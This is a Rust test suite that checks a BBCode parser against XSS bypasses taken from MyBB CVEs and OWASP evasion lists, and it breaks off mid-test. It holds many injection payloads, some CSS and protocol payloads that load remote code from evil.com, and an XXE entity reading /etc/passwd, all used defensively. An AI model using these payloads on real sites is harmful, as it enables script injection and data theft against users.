//! Advanced security tests based on real-world CVEs and attack research.
//!
//! Sources:
//! - MyBB CVE-2021-27279, CVE-2019-12830
//! - dcwatson/bbcode Issue #16
//! - OWASP XSS Filter Evasion Cheat Sheet
//! - PT Security: Fuzzing for XSS via nested parsers
//! - ruforo BBCode parser vulnerability (GitHub: jaw-sh/ruforo PR #8)

use bbcode::parse;

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/// Check if an event handler appears in an actual HTML attribute context.
/// Returns false if the pattern only appears in BBCode text or inside attribute values (which is safe).
fn has_dangerous_event_handler(output: &str, handler: &str) -> bool {
    let pattern = format!(" {}=", handler);
    let lower_output = output.to_lowercase();
    let lower_pattern = pattern.to_lowercase();

    if !lower_output.contains(&lower_pattern) {
        return false;
    }

    // Check if it's actually as an HTML attribute (not inside an attribute value)
    for (i, _) in lower_output.match_indices(&lower_pattern) {
        let before = &output[..i];

        // Check if we're inside an HTML tag (after < and before >)
        let last_open = before.rfind('<');
        let last_close = before.rfind('>');

        if let Some(open_pos) = last_open {
            if last_close.map_or(true, |close_pos| open_pos > close_pos) {
                // We're after a < without a closing > - potentially inside a tag
                // Now check if we're inside an attribute value (between quotes)
                let tag_content = &before[open_pos..];

                // Count unescaped quotes after the tag start
                let quote_count = tag_content
                    .chars()
                    .filter(|&c| c == '"')
                    .count();

                // If odd number of quotes, we're inside an attribute value (safe)
                // If even number (including 0), we're at attribute level (dangerous)
                if quote_count % 2 == 0 {
                    return true; // Dangerous: at HTML attribute level
                }
            }
        }
    }
    false
}

/// Check if dangerous CSS patterns appear in actual HTML style attributes.
/// Returns false if CSS patterns only appear in text/BBCode context.
fn has_dangerous_css_in_html(output: &str, pattern: &str) -> bool {
    let lower = output.to_lowercase();
    let pattern_lower = pattern.to_lowercase();

    // Look for style=" patterns that contain the dangerous pattern
    for (i, _) in lower.match_indices("style=\"") {
        let style_start = i + 7; // After style="
        if let Some(end) = lower[style_start..].find('"') {
            let style_content = &lower[style_start..style_start + end];
            if style_content.contains(&pattern_lower) {
                return true;
            }
        }
    }
    false
}

// ============================================================================
// SECTION 1: CONTROL CHARACTER PREFIX BYPASS (dcwatson/bbcode #16)
// ============================================================================

mod control_char_bypass {
    use super::*;

    #[test]
    fn control_char_x01_javascript() {
        // \x01 before javascript: bypassed filters in dcwatson/bbcode
        let result = parse("[url=\x01javascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Control char \\x01 prefix bypass"
        );
        assert!(
            !result.to_lowercase().contains("href=\"\x01javascript:"),
            "Should not preserve control char in href"
        );
    }

    #[test]
    fn control_char_range_javascript() {
        // Test all control characters \x01-\x1F
        for i in 1u8..=31 {
            let payload = format!("[url={}javascript:alert(1)]Click[/url]", char::from(i));
            let result = parse(&payload);
            assert!(
                !result.to_lowercase().contains("href=\"javascript:"),
                "Control char \\x{:02X} prefix bypass failed",
                i
            );
        }
    }

    #[test]
    fn control_char_x00_mid_keyword() {
        // Null byte in middle of keyword
        let result = parse("[url=java\x00script:alert(1)]Click[/url]");
        assert!(
            !result.contains("href=\"javascript:"),
            "Null byte mid-keyword bypass"
        );
    }

    #[test]
    fn control_char_before_data_protocol() {
        let result = parse("[url=\x01data:text/html,<script>alert(1)</script>]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"data:"),
            "Control char before data: protocol"
        );
    }

    #[test]
    fn control_char_before_vbscript() {
        let result = parse("[url=\x01vbscript:msgbox(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"vbscript:"),
            "Control char before vbscript: protocol"
        );
    }

    #[test]
    fn del_char_x7f_javascript() {
        // DEL character (0x7F)
        let result = parse("[url=\x7Fjavascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "DEL char prefix bypass"
        );
    }
}

// ============================================================================
// SECTION 2: NESTED TAG PARSER ATTACKS (MyBB CVE-2021-27279)
// ============================================================================

mod nested_tag_attacks {
    use super::*;

    #[test]
    fn nested_email_onpointerover() {
        // MyBB CVE-2021-27279 pattern
        let result = parse("[email][email= onpointerover=alert()//]text[/email]");
        // Safe if the pattern only appears in BBCode text context, not in HTML attributes
        assert!(
            !has_dangerous_event_handler(&result, "onpointerover"),
            "Nested email onpointerover injection. Output: {}",
            result
        );
    }

    #[test]
    fn nested_email_with_question_mark() {
        // Another MyBB pattern
        let result = parse("[email]a@a.a?[email=a@a.a? onmouseover=alert(1) a]a[/email][/email]");
        assert!(
            !has_dangerous_event_handler(&result, "onmouseover"),
            "Nested email question mark attack. Output: {}",
            result
        );
    }

    #[test]
    fn nested_url_onmousemove() {
        // Nested URL with event handler injection
        let result = parse("[url]http://google.com?[url] onmousemove=alert(1);//[/url][/url]");
        assert!(
            !has_dangerous_event_handler(&result, "onmousemove"),
            "Nested URL onmousemove injection. Output: {}",
            result
        );
    }

    #[test]
    fn triple_nested_tags() {
        let result = parse("[url][url][url=javascript:alert(1)]x[/url][/url][/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Triple nested javascript: injection"
        );
    }

    #[test]
    fn nested_img_in_url_onerror() {
        // Attempt to use img onerror inside url tag
        let result = parse(r#"[url=http://x.com][img]x" onerror="alert(1)[/img][/url]"#);
        assert!(
            !result.contains(" onerror=") || result.contains("&quot;"),
            "Nested img onerror in url"
        );
    }

    #[test]
    fn nested_url_with_newline_breakout() {
        let result = parse("[url]http://x.com\n[url=javascript:alert(1)]x[/url][/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Nested URL with newline breakout"
        );
    }

    #[test]
    fn nested_quote_with_url_injection() {
        let result = parse("[quote][url= onclick=alert(1)]text[/url][/quote]");
        assert!(
            !result.contains(" onclick=") || result.contains("[url="),
            "Nested quote with url onclick injection"
        );
    }

    #[test]
    fn deeply_nested_mixed_tags() {
        let result = parse("[b][url][i][email]a@a.a\" onclick=\"alert(1)[/email][/i][/url][/b]");
        assert!(
            !result.contains(" onclick=") || result.contains("&quot;"),
            "Deeply nested mixed tags with injection"
        );
    }
}

// ============================================================================
// SECTION 3: URL-ENCODED NESTED BBCODE (MyBB CVE-2019-12830)
// ============================================================================

mod url_encoded_bbcode {
    use super::*;

    #[test]
    fn url_encoded_url_tag() {
        // %5B = [, %5D = ], %3D = =
        // Decodes to: [url=javascript:alert(1)]
        let result = parse("[url]http://x.com/%5Burl%3Djavascript:alert(1)%5Dx%5B/url%5D[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "URL-encoded nested BBCode injection"
        );
    }

    #[test]
    fn double_url_encoding() {
        // %2522 = %22 = "
        let result = parse("[url]http://example.com/%2522onclick=alert(1)[/url]");
        // After potential double-decode, should not have unescaped onclick
        assert!(
            !result.contains(" onclick=") || result.contains("&quot;") || result.contains("%"),
            "Double URL encoding bypass"
        );
    }

    #[test]
    fn triple_url_encoding() {
        // %252522 -> %2522 -> %22 -> "
        let result = parse("[url]http://example.com/%252522onclick=alert(1)[/url]");
        assert!(!result.contains(" onclick="), "Triple URL encoding bypass");
    }

    #[test]
    fn url_encoded_event_handler() {
        // %20 = space, can be used to inject attributes
        let result = parse("[url]http://x.com/%20onclick=alert(1)[/url]");
        assert!(
            !result.contains(" onclick="),
            "URL-encoded space event handler injection"
        );
    }

    #[test]
    fn url_encoded_javascript_protocol() {
        // %6A%61%76%61... = javascript
        let result =
            parse("[url=%6A%61%76%61%73%63%72%69%70%74%3Aalert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "URL-encoded javascript protocol"
        );
    }
}

// ============================================================================
// SECTION 4: MODERN EVENT HANDLERS
// ============================================================================

mod modern_event_handlers {
    use super::*;

    #[test]
    fn onpointerover() {
        let result = parse(r#"[url=" onpointerover="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "onpointerover"),
            "onpointerover handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn onpointerenter() {
        let result = parse(r#"[url=" onpointerenter="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "onpointerenter"),
            "onpointerenter handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn onpointerdown() {
        let result = parse(r#"[url=" onpointerdown="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "onpointerdown"),
            "onpointerdown handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn ontouchstart() {
        let result = parse(r#"[url=" ontouchstart="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "ontouchstart"),
            "ontouchstart handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn onanimationend() {
        let result = parse(r#"[url=" onanimationend="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "onanimationend"),
            "onanimationend handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn onfocusin() {
        let result = parse(r#"[url=" onfocusin="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "onfocusin"),
            "onfocusin handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn onauxclick() {
        let result = parse(r#"[url=" onauxclick="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "onauxclick"),
            "onauxclick handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn onwheel() {
        let result = parse(r#"[url=" onwheel="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "onwheel"),
            "onwheel handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn ondrag() {
        let result = parse(r#"[url=" ondrag="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "ondrag"),
            "ondrag handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn ondragstart() {
        let result = parse(r#"[url=" ondragstart="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "ondragstart"),
            "ondragstart handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn ondragend() {
        let result = parse(r#"[url=" ondragend="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "ondragend"),
            "ondragend handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn oncopy() {
        let result = parse(r#"[url=" oncopy="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "oncopy"),
            "oncopy handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn onpaste() {
        let result = parse(r#"[url=" onpaste="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "onpaste"),
            "onpaste handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn oncut() {
        let result = parse(r#"[url=" oncut="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "oncut"),
            "oncut handler injection. Output: {}",
            result
        );
    }

    #[test]
    fn ontransitionend() {
        let result = parse(r#"[url=" ontransitionend="alert(1)]Click[/url]"#);
        assert!(
            !has_dangerous_event_handler(&result, "ontransitionend"),
            "ontransitionend handler injection. Output: {}",
            result
        );
    }
}

// ============================================================================
// SECTION 5: CONTENTEDITABLE/TABINDEX ATTACK (SCEditor vulnerability)
// ============================================================================

mod contenteditable_attacks {
    use super::*;

    #[test]
    fn contenteditable_tabindex_onfocus() {
        // SCEditor attack pattern
        let result = parse(
            r#"[email]a@a[size="onfocus=alert(1) contenteditable tabindex=0 id=xss q"]a[/email].a[/size]"#,
        );
        assert!(
            !result.contains(" onfocus=") || result.contains("&quot;"),
            "contenteditable/tabindex onfocus attack"
        );
        assert!(
            !result.contains(" contenteditable") || result.contains("["),
            "contenteditable should not appear as attribute"
        );
    }

    #[test]
    fn autofocus_onfocus() {
        let result = parse(r#"[url=" autofocus onfocus="alert(1)]Click[/url]"#);
        assert!(
            !result.contains(" autofocus") || result.contains("&quot;") || result.contains("[url="),
            "autofocus onfocus injection"
        );
    }

    #[test]
    fn tabindex_injection() {
        let result = parse(r#"[url=" tabindex=0 onfocus="alert(1)]Click[/url]"#);
        assert!(
            !result.contains(" tabindex=") || result.contains("&quot;") || result.contains("[url="),
            "tabindex injection"
        );
    }

    #[test]
    fn accesskey_onclick() {
        let result = parse(r#"[url=" accesskey=x onclick="alert(1)]Click[/url]"#);
        assert!(
            !result.contains(" accesskey=") || result.contains("&quot;") || result.contains("[url="),
            "accesskey onclick injection"
        );
    }

    #[test]
    fn style_position_fixed() {
        // Using position:fixed to overlay the page
        let result = parse(
            r#"[url=" style="position:fixed;top:0;left:0;width:100%;height:100%" onclick="alert(1)]Click[/url]"#,
        );
        assert!(
            !result.contains(" onclick=") || result.contains("&quot;") || result.contains("[url="),
            "style position:fixed onclick"
        );
    }
}

// ============================================================================
// SECTION 6: ADVANCED ENTITY ENCODING
// ============================================================================

mod advanced_encoding {
    use super::*;

    #[test]
    fn hex_entity_without_semicolon() {
        // &#x6A = j - some parsers accept entities without semicolons
        let result = parse("[url=&#x6Aavascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Hex entity without semicolon"
        );
    }

    #[test]
    fn padded_zero_decimal_entities() {
        // &#0000106 = j with padding
        let result = parse(
            "[url=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#58;alert(1)]Click[/url]",
        );
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Padded zero decimal entities"
        );
    }

    #[test]
    fn mixed_hex_decimal_entities() {
        // Mix of hex and decimal: &#x6A = j (hex), &#97 = a (decimal)
        let result = parse("[url=&#x6A&#97vascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Mixed hex/decimal entities"
        );
    }

    #[test]
    fn fromcharcode_in_url() {
        // This is actually in the test already via sanitize test, but add explicit URL context
        let result = parse("[url=javascript:alert(String.fromCharCode(88,83,83))]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "fromCharCode in URL blocked"
        );
    }

    #[test]
    fn html_entity_without_semicolon_decimal() {
        // &#106 = j (without semicolon)
        let result = parse("[url=&#106avascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Decimal entity without semicolon"
        );
    }

    #[test]
    fn unicode_escape_in_url() {
        // Unicode escape: \u006A = j
        let result = parse("[url=\\u006Aavascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Unicode escape in URL"
        );
    }

    #[test]
    fn octal_escape_attempt() {
        // Octal: \152 = j (some languages)
        let result = parse("[url=\\152avascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Octal escape attempt"
        );
    }

    #[test]
    fn entity_encoded_onclick() {
        // &#111;&#110;&#99;&#108;&#105;&#99;&#107; = onclick
        let result =
            parse(r#"[url=" &#111;&#110;&#99;&#108;&#105;&#99;&#107;="alert(1)]Click[/url]"#);
        assert!(
            !result.contains(" onclick="),
            "Entity encoded onclick blocked"
        );
    }
}

// ============================================================================
// SECTION 7: CSS INJECTION VECTORS
// ============================================================================

mod css_injection_advanced {
    use super::*;

    #[test]
    fn css_background_image_javascript() {
        let result =
            parse("[color=#ff0000;background-image:url(javascript:alert(1));]text[/color]");
        // Safe if the invalid color is rejected and rendered as BBCode text
        // Dangerous only if it ends up in a style attribute
        assert!(
            !has_dangerous_css_in_html(&result, "background-image:url(javascript:"),
            "CSS background-image javascript. Output: {}",
            result
        );
    }

    #[test]
    fn css_moz_binding() {
        let result =
            parse("[font=Arial;-moz-binding:url(http://evil.com/xss.xml#xss)]text[/font]");
        // Safe if rendered as BBCode text (invalid font rejected)
        assert!(
            !has_dangerous_css_in_html(&result, "-moz-binding:"),
            "CSS -moz-binding blocked. Output: {}",
            result
        );
    }

    #[test]
    fn css_backslash_expression() {
        // Backslash obfuscation: ex\pression
        let result = parse(r#"[color=red;x:ex\pression(alert(1))]text[/color]"#);
        // Safe if rendered as BBCode text (invalid color rejected)
        assert!(
            !has_dangerous_css_in_html(&result, "expression("),
            "Backslash CSS expression. Output: {}",
            result
        );
    }

    #[test]
    fn css_behavior() {
        let result = parse("[color=red;behavior:url(http://evil.com/xss.htc)]text[/color]");
        // Safe if rendered as BBCode text (invalid color rejected)
        assert!(
            !has_dangerous_css_in_html(&result, "behavior:"),
            "CSS behavior blocked. Output: {}",
            result
        );
    }

    #[test]
    fn css_import() {
        let result = parse("[color=red;@import url(http://evil.com/xss.css);]text[/color]");
        // Safe if rendered as BBCode text (invalid color rejected)
        assert!(
            !has_dangerous_css_in_html(&result, "@import"),
            "CSS @import blocked. Output: {}",
            result
        );
    }

    #[test]
    fn css_webkit_filter() {
        let result = parse("[color=red;-webkit-filter:url(javascript:alert(1));]text[/color]");
        // Safe if rendered as BBCode text (invalid color rejected)
        assert!(
            !has_dangerous_css_in_html(&result, "-webkit-filter:url(javascript:"),
            "CSS -webkit-filter blocked. Output: {}",
            result
        );
    }

    #[test]
    fn css_list_style_image() {
        let result = parse("[color=red;list-style-image:url(javascript:alert(1));]text[/color]");
        // Safe if rendered as BBCode text (invalid color rejected)
        assert!(
            !has_dangerous_css_in_html(&result, "list-style-image:url(javascript:"),
            "CSS list-style-image blocked. Output: {}",
            result
        );
    }

    #[test]
    fn css_cursor_url() {
        let result = parse("[color=red;cursor:url(javascript:alert(1));]text[/color]");
        // Safe if rendered as BBCode text (invalid color rejected)
        assert!(
            !has_dangerous_css_in_html(&result, "cursor:url(javascript:"),
            "CSS cursor url blocked. Output: {}",
            result
        );
    }

    #[test]
    fn css_content_url() {
        let result = parse("[color=red;content:url(javascript:alert(1));]text[/color]");
        // Safe if rendered as BBCode text (invalid color rejected)
        assert!(
            !has_dangerous_css_in_html(&result, "content:url(javascript:"),
            "CSS content url blocked. Output: {}",
            result
        );
    }
}

// ============================================================================
// SECTION 8: SVG AND POLYGLOT ATTACKS
// ============================================================================

mod svg_polyglot {
    use super::*;

    #[test]
    fn svg_fragment_onload() {
        let result = parse("[img]http://evil.com/image.svg#<svg onload=alert(1)>[/img]");
        // URL with < should be rejected, so no img tag rendered
        // OR if it's rendered as BBCode text, that's safe too
        // The key is no unescaped <svg or onload= in HTML context
        let has_unescaped_svg =
            result.contains("<svg") && !result.contains("&lt;svg");
        let has_unescaped_onload = has_dangerous_event_handler(&result, "onload");
        assert!(
            !has_unescaped_svg && !has_unescaped_onload,
            "SVG fragment onload injection. Output: {}",
            result
        );
    }

    #[test]
    fn svg_use_xlink() {
        let result = parse("[img]http://evil.com/image.svg#<use xlink:href=\"data:image/svg+xml,%3Csvg%20onload='alert(1)'%3E%3C/svg%3E\"/>[/img]");
        // URL with < and " should be rejected
        let has_unescaped_use = result.contains("<use") && !result.contains("&lt;use");
        assert!(
            !has_unescaped_use,
            "SVG use xlink injection. Output: {}",
            result
        );
    }

    #[test]
    fn math_tag_injection() {
        let result = parse("<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(1)\">CLICKME</maction></math>");
        // Raw HTML should be escaped
        assert!(
            result.contains("&lt;math"),
            "MathML injection blocked. Output: {}",
            result
        );
    }

    #[test]
    fn svg_animate_onbegin() {
        let result = parse("[img]http://x.com#<svg><animate onbegin=alert(1)></svg>[/img]");
        // URL with < should be rejected
        let has_unescaped_animate =
            result.contains("<animate") && !result.contains("&lt;animate");
        assert!(
            !has_unescaped_animate,
            "SVG animate onbegin blocked. Output: {}",
            result
        );
    }

    #[test]
    fn svg_set_attributename() {
        let result = parse(
            "[img]http://x.com#<svg><set attributename=onmouseover to=alert(1)></svg>[/img]",
        );
        // URL with < should be rejected
        let has_unescaped_set = result.contains("<set") && !result.contains("&lt;set");
        assert!(
            !has_unescaped_set,
            "SVG set attributename blocked. Output: {}",
            result
        );
    }

    #[test]
    fn foreignobject_body() {
        let result = parse(
            "[img]http://x.com#<svg><foreignObject><body onload=alert(1)></svg>[/img]",
        );
        // URL with < should be rejected
        let has_unescaped_foreign =
            result.contains("<foreignObject") && !result.contains("&lt;foreignObject");
        let has_dangerous_onload = has_dangerous_event_handler(&result, "onload");
        assert!(
            !has_unescaped_foreign && !has_dangerous_onload,
            "SVG foreignObject blocked. Output: {}",
            result
        );
    }

    #[test]
    fn xml_entity_expansion() {
        let result = parse(
            "[code]<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>[/code]",
        );
        // Code blocks should escape this
        assert!(
            result.contains("&lt;!DOCTYPE") || result.contains("&amp;xxe;"),
            "XML entity expansion escaped in code. Output: {}",
            result
        );
    }
}

// ============================================================================
// SECTION 9: PROTOCOL VARIATIONS
// ============================================================================

mod protocol_variations {
    use super::*;

    #[test]
    fn ecmascript_protocol() {
        let result = parse("[url=ecmascript:alert(1)]Click[/url]");
        // While not widely supported, some old browsers accepted this
        assert!(
            !result.contains("href=\"ecmascript:"),
            "ecmascript: protocol blocked"
        );
    }

    #[test]
    fn file_protocol_triple_slash() {
        let result = parse("[url=file:///etc/passwd]Click[/url]");
        assert!(!result.contains("href=\"file:"), "file:/// protocol blocked");
    }

    #[test]
    fn javascript_with_slashes() {
        // javascript:/// is sometimes used
        let result = parse("[url=javascript:///alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "javascript:/// blocked"
        );
    }

    #[test]
    fn javascript_with_leading_whitespace() {
        let result = parse("[url=  javascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Leading whitespace javascript: blocked"
        );
    }

    #[test]
    fn javascript_with_leading_newlines() {
        let result = parse("[url=\n\njavascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Leading newlines javascript: blocked"
        );
    }

    #[test]
    fn javascript_with_leading_tabs() {
        let result = parse("[url=\t\tjavascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Leading tabs javascript: blocked"
        );
    }

    #[test]
    fn feed_protocol() {
        // Some browsers support feed: protocol
        let result = parse("[url=feed:javascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "feed: protocol bypass blocked"
        );
    }

    #[test]
    fn mhtml_protocol() {
        // IE specific protocol
        let result = parse("[url=mhtml:http://evil.com/xss.mht!xss.htm]Click[/url]");
        assert!(
            !result.contains("href=\"mhtml:"),
            "mhtml: protocol blocked"
        );
    }

    #[test]
    fn jar_protocol() {
        // Java archive protocol
        let result = parse("[url=jar:http://evil.com/evil.jar!/index.html]Click[/url]");
        assert!(!result.contains("href=\"jar:"), "jar: protocol blocked");
    }

    #[test]
    fn view_source_protocol() {
        let result = parse("[url=view-source:javascript:alert(1)]Click[/url]");
        assert!(
            !result.contains("href=\"view-source:"),
            "view-source: protocol blocked"
        );
    }
}

// ============================================================================
// SECTION 10: ATTRIBUTE INJECTION EDGE CASES
// ============================================================================

mod attribute_edge_cases {
    use super::*;

    #[test]
    fn backtick_breakout() {
        // Template literal backticks
        let result = parse("[url=http://x.com` onclick=`alert(1)]Click[/url]");
        // Safe if rendered as BBCode text or if onclick is not in HTML attribute context
        assert!(
            !has_dangerous_event_handler(&result, "onclick"),
            "Backtick breakout blocked. Output: {}",
            result
        );
    }

    #[test]
    fn newline_attribute_injection() {
        // Newline can sometimes terminate attribute value
        let result = parse("[url=http://x.com\nonclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Newline attribute injection blocked"
        );
    }

    #[test]
    fn tab_attribute_injection() {
        let result = parse("[url=http://x.com\tonclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Tab attribute injection blocked"
        );
    }

    #[test]
    fn formfeed_injection() {
        // Form feed (\x0C) as attribute separator
        let result = parse("[url=http://x.com\x0Conclick=alert(1)]Click[/url]");
        assert!(!result.contains(" onclick="), "Form feed injection blocked");
    }

    #[test]
    fn vertical_tab_injection() {
        // Vertical tab (\x0B)
        let result = parse("[url=http://x.com\x0Bonclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Vertical tab injection blocked"
        );
    }

    #[test]
    fn angle_bracket_in_attribute() {
        // Attempt to close tag and start new one
        let result = parse("[url=http://x.com><script>alert(1)</script><a href=x]Click[/url]");
        assert!(
            !result.contains("<script>"),
            "Angle bracket tag injection blocked"
        );
    }

    #[test]
    fn equals_in_value_confusion() {
        // Multiple = signs to confuse parser
        let result = parse("[url=a=b=c onclick=alert(1) d=e]Click[/url]");
        assert!(
            !result.contains(" onclick=") || result.contains("&quot;") || result.contains("[url="),
            "Multiple equals confusion blocked"
        );
    }

    #[test]
    fn semicolon_attribute_separator() {
        // Using semicolon as separator (CSS style)
        let result = parse("[url=http://x.com;onclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Semicolon separator injection blocked"
        );
    }

    #[test]
    fn comma_attribute_separator() {
        let result = parse("[url=http://x.com,onclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Comma separator injection blocked"
        );
    }

    #[test]
    fn null_between_attributes() {
        let result = parse("[url=http://x.com\x00onclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Null between attributes blocked"
        );
    }

    #[test]
    fn unicode_separator() {
        // Unicode non-breaking space
        let result = parse("[url=http://x.com\u{00A0}onclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Unicode NBSP separator blocked"
        );
    }

    #[test]
    fn unicode_line_separator() {
        // Unicode line separator (U+2028)
        let result = parse("[url=http://x.com\u{2028}onclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Unicode line separator blocked"
        );
    }

    #[test]
    fn unicode_paragraph_separator() {
        // Unicode paragraph separator (U+2029)
        let result = parse("[url=http://x.com\u{2029}onclick=alert(1)]Click[/url]");
        assert!(
            !result.contains(" onclick="),
            "Unicode paragraph separator blocked"
        );
    }
}

// ============================================================================
// SECTION 11: REGRESSION - ENSURE VALID INPUT STILL WORKS
// ============================================================================

mod regression_valid_input {
    use super::*;

    #[test]
    fn url_with_special_chars_in_path() {
        let result = parse("[url=https://example.com/path?a=1&b=2#section]Link[/url]");
        assert!(
            result.contains("href=\"https://example.com/path?a=1&amp;b=2#section\""),
            "URL with query params and fragment"
        );
    }

    #[test]
    fn url_with_unicode_path() {
        let result = parse("[url=https://example.com/日本語]Link[/url]");
        assert!(
            result.contains("href=\"https://example.com/日本語\""),
            "URL with unicode path"
        );
    }

    #[test]
    fn url_with_percent_encoding() {
        let result = parse("[url=https://example.com/path%20with%20spaces]Link[/url]");
        assert!(
            result.contains("href=\"https://example.com/path%20with%20spaces\""),
            "URL with percent encoding preserved"
        );
    }

    #[test]
    fn email_with_plus() {
        let result = parse("[email]user+tag@example.com[/email]");
        assert!(
            result.contains("mailto:user+tag@example.com"),
            "Email with + sign"
        );
    }

    #[test]
    fn email_with_subdomain() {
        let result = parse("[email]user@sub.domain.example.com[/email]");
        assert!(
            result.contains("mailto:user@sub.domain.example.com"),
            "Email with subdomain"
        );
    }

    #[test]
    fn url_with_port() {
        let result = parse("[url=https://example.com:8080/path]Link[/url]");
        assert!(
            result.contains("href=\"https://example.com:8080/path\""),
            "URL with port"
        );
    }

    #[test]
    fn url_with_username() {
        let result = parse("[url=https://user@example.com/path]Link[/url]");
        assert!(
            result.contains("href=\"https://user@example.com/path\""),
            "URL with username"
        );
    }

    #[test]
    fn legitimate_mailto_link() {
        let result = parse("[url=mailto:user@example.com]Contact[/url]");
        assert!(
            result.contains("href=\"mailto:user@example.com\""),
            "mailto: link works"
        );
    }

    #[test]
    fn complex_nested_formatting() {
        let result = parse("[b][i][u][color=red]Complex[/color][/u][/i][/b]");
        assert!(result.contains("<strong>"), "Bold renders");
        assert!(result.contains("<em>"), "Italic renders");
        assert!(result.contains("<u>"), "Underline renders");
        assert!(result.contains("color: red"), "Color renders");
    }

    #[test]
    fn code_with_special_chars() {
        let result = parse("[code]<script>alert('test');</script>[/code]");
        assert!(
            result.contains("&lt;script&gt;"),
            "Script in code is escaped"
        );
        assert!(result.contains("<pre"), "Pre tag renders");
        assert!(result.contains("<code>"), "Code tag renders");
    }

    #[test]
    fn quote_with_special_author() {
        let result = parse("[quote=\"John O'Brien\"]Quote text[/quote]");
        // Author with apostrophe should be escaped
        assert!(
            result.contains("John O") || result.contains("John O&#x27;Brien"),
            "Quote author with apostrophe"
        );
    }

    #[test]
    fn image_with_complex_url() {
        let result = parse("[img]https://example.com/image.png?size=100&format=webp[/img]");
        assert!(result.contains("<img"), "Image renders");
        assert!(
            result.contains("src=\"https://example.com/image.png?size=100&amp;format=webp\""),
            "Complex image URL"
        );
    }

    #[test]
    fn list_with_nested_content() {
        let result = parse("[list][*][b]Bold item[/b][*][url=https://x.com]Link item[/url][/list]");
        assert!(result.contains("<ul"), "List renders");
        assert!(result.contains("<li>"), "List items render");
        assert!(result.contains("<strong>"), "Nested bold renders");
        assert!(result.contains("href="), "Nested link renders");
    }
}

// ============================================================================
// SECTION 12: ADDITIONAL CVE-BASED TESTS
// ============================================================================

mod cve_based_tests {
    use super::*;

    /// MyBB CVE-2021-27889 - Nested auto URL parsing via [img] with onerror
    #[test]
    fn mybb_cve_2021_27889_img_onerror() {
        let result = parse(r#"[img]http://x.com/image.png" onerror="alert(1)[/img]"#);
        assert!(
            !result.contains(" onerror=") || result.contains("[img]"),
            "MyBB CVE-2021-27889 img onerror blocked"
        );
    }

    /// CVE-2019-12830 - Video BBCode persistent XSS
    #[test]
    fn mybb_cve_2019_12830_style() {
        // Simulated video tag attack pattern
